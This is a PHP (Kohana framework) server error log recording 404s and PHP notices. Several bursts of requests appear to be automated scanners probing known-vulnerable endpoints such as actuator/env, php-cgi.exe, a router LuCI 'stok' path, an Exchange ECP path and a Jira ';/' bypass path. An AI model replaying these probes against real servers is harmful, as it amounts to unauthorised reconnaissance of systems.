<?php defined('SYSPATH') OR die('No direct script access.'); ?>

2025-10-24 00:17:52 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL advance-search.html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 00:17:52 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL advance-search.html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 00:36:45 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 00:36:45 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 00:58:54 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 00:58:54 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 01:09:52 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL advance-search.html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:09:52 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL advance-search.html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:14:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL advance-search.html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:14:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL advance-search.html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:27:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/how_it_works.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:27:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/how_it_works.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:28:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:28:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:28:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:28:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:38:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/pricing.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:38:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: passengers/pricing.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:13 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:13 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:13 --- ERROR: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
2025-10-24 01:50:13 --- STRACE: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
--
#0 /var/www/html/application/classes/controller/api.php(50): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 50, Array)
#1 [internal function]: Controller_Api->action_index()
#2 /var/www/html/system/classes/kohana/request/client/internal.php(118): ReflectionMethod->invoke(Object(Controller_Api))
#3 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#4 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#5 /var/www/html/index.php(115): Kohana_Request->execute()
#6 {main}
2025-10-24 01:50:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 01:50:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql/api was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql/api was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 01:50:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webjars/swagger-ui/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webjars/swagger-ui/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/v1/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/v1/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v3/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v3/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api-docs/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api-docs/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL @vite/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL @vite/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-cgi/php-cgi.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-cgi/php-cgi.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:18 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL server was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:18 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL server was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:18 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:18 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:19 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:19 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:19 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:19 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:20 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL _all_dbs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:20 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL _all_dbs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 01:50:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: s/331313e2438313e28323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: s/331313e2438313e28323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 01:50:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 01:50:22 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 01:50:22 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 02:31:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL ReportServer was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 02:31:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL ReportServer was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 02:32:45 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL developmentserver/metadatauploader was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 02:32:45 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL developmentserver/metadatauploader was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 02:37:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 02:37:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 02:40:01 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/gateway/routes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 02:40:01 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/gateway/routes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 02:48:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL owa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 02:48:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL owa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:26 --- ERROR: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
2025-10-24 03:46:26 --- STRACE: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
--
#0 /var/www/html/application/classes/controller/api.php(50): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 50, Array)
#1 [internal function]: Controller_Api->action_index()
#2 /var/www/html/system/classes/kohana/request/client/internal.php(118): ReflectionMethod->invoke(Object(Controller_Api))
#3 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#4 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#5 /var/www/html/index.php(115): Kohana_Request->execute()
#6 {main}
2025-10-24 03:46:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 03:46:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:27 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql/api was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:27 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql/api was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:27 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 03:46:27 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webjars/swagger-ui/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webjars/swagger-ui/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/v1/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/v1/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
